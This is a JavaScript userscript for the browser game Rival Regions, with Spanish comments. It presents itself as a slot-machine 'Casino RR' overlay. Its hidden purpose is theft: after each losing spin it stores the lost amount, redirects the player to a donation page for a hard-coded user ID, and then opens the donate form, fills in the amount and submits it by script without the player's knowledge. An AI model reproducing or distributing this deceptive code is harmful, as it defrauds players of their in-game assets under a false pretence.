(function () {
    'use strict';

    const DONATION_USER_ID = '2000962000';
    const DONATION_URL = `https://rivalregions.com/#slide/donate/user/${DONATION_USER_ID}`;

    // 🔄 Redirección inteligente
    function redirigirADonacion() {
        const destino = `slide/donate/user/${DONATION_USER_ID}`;
        const enlace = document.querySelector(`[action="${destino}"]`);

        if (enlace) {
            enlace.click();
        } else {
            window.location.href = DONATION_URL;
            setTimeout(() => {
                location.reload(); // 🧼 Forzar carga si no funciona el slide
            }, 800);
        }
    }

    // 🎰 Funciones del casino
    function randSimbolo() {
        const simbolos = ["🍒", "🍋", "🍇", "⭐", "💎"];
        return simbolos[Math.floor(Math.random() * simbolos.length)];
    }

    function obtenerSaldoJuego() {
        const elem = document.querySelector('#m');
        if (!elem) return 0;
        const texto = elem.textContent;
        const numero = Number(texto.replace(/\./g, ''));
        return numero || 0;
    }

    function jugarCasino(apuesta, saldoActual) {
        if (apuesta > saldoActual) {
            return { mensaje: "No tienes suficiente saldo.", exito: false };
        }

        const resultado = [randSimbolo(), randSimbolo(), randSimbolo()];
        const combinacion = resultado.join(" ");
        let ganancia = 0;

        if (resultado[0] === resultado[1] && resultado[1] === resultado[2]) {
            ganancia = apuesta * 10;
        } else if (resultado[0] === resultado[1] || resultado[1] === resultado[2]) {
            ganancia = apuesta * 2;
        }

        const final = saldoActual - apuesta + ganancia;

        return {
            mensaje: `
                <p style="font-size:18px; text-align:center;">${combinacion}</p>
                <p>${ganancia > 0 ? "¡Ganaste $" + ganancia + "!" : "Perdiste $" + apuesta + "..."}</p>
                <p><b>Saldo nuevo estimado:</b> $${final.toFixed(2)}</p>
            `,
            exito: true,
            perdida: ganancia === 0 ? apuesta : 0
        };
    }

    // 🎁 Donación automática con activación y espera
function intentarDonar() {
    const perdida = localStorage.getItem('casino_perdida');
    const cantidad = parseFloat(perdida);
    if (!perdida || isNaN(cantidad) || cantidad <= 0) return;

    // 👀 Espera a que el recurso esté presente
    const esperarRecurso = setInterval(() => {
        const recurso = document.querySelector('.donate_w');
        if (recurso) {
            recurso.click();
            clearInterval(esperarRecurso);

            // ⚡ Ahora espera a que salgan el input y botón
            const esperarCampos = setInterval(() => {
                const input = document.querySelector('input.donate_amount');
                const boton = document.querySelector('.donate_sell_button');

                if (input && boton) {
                    input.value = cantidad.toString();
                    const evento = new Event('input', { bubbles: true });
                    input.dispatchEvent(evento);
                    boton.click();

                    console.log(`✅ Donación automática realizada: €${cantidad}`);
                    localStorage.removeItem('casino_perdida');
                    clearInterval(esperarCampos);
                }
            }, 500);
        }
    }, 500);
}
    // 🎨 Interfaz del casino
    const casinoHTML = `
        <div id="casinoRR" style="position: fixed; top: 100px; right: 30px; z-index: 9999; background: #111; color: white; border: 2px solid gold; border-radius: 10px; padding: 15px; font-family: Arial, sans-serif; width: 200px; display: none;">
            <h3 style="margin-top:0; text-align:center;">🎰 Casino RR</h3>
            <p><b>Saldo:</b> <span id="casino_saldo">...</span> $</p>
            <input id="casino_apuesta" type="number" placeholder="Apuesta $" min="1" style="width: 100%; padding: 5px; margin-top: 5px;" />
            <button id="casino_jugar" style="margin-top:10px; width:100%; background-color: gold; color:black;">Jugar</button>
            <div id="casino_resultado" style="margin-top: 10px;"></div>
        </div>
        <button id="btnAbrirCasino" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999; background-color: gold; color:black; border: none; padding: 10px; border-radius: 8px; font-weight: bold;">
            🎰 Abrir Casino
        </button>
    `;

    // 🔧 Insertar casino
    function insertarCasino() {
        if (document.querySelector("#casinoRR")) return;
        document.body.insertAdjacentHTML('beforeend', casinoHTML);

        const btnCasino = document.querySelector("#btnAbrirCasino");
        const contenedorCasino = document.querySelector("#casinoRR");
        const btnJugar = document.querySelector("#casino_jugar");
        const spanSaldo = document.querySelector("#casino_saldo");
        const inputApuesta = document.querySelector("#casino_apuesta");
        const divResultado = document.querySelector("#casino_resultado");

        function actualizarSaldo() {
            const saldo = obtenerSaldoJuego();
            spanSaldo.textContent = saldo.toFixed(2);
        }

        btnCasino.addEventListener("click", () => {
            contenedorCasino.style.display = (contenedorCasino.style.display === "none" ? "block" : "none");
            actualizarSaldo();
        });

        btnJugar.addEventListener("click", () => {
            const apuesta = parseFloat(inputApuesta.value);
            const saldo = obtenerSaldoJuego();

            if (isNaN(apuesta) || apuesta <= 0) {
                alert("Ingresa una cantidad válida.");
                return;
            }

            const resultado = jugarCasino(apuesta, saldo);
            divResultado.innerHTML = resultado.mensaje;

            if (resultado.perdida > 0) {
                localStorage.setItem('casino_perdida', resultado.perdida);
                setTimeout(redirigirADonacion, 500);
            }
        });
    }

    // ⚙️ Lógica principal
    function main() {
        insertarCasino();
        if (window.location.hash.includes(`donate/user/${DONATION_USER_ID}`)) {
            intentarDonar();
        }
    }

    // 🕐 Esperar carga del DOM
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", main);
    } else {
        main();
    }

})();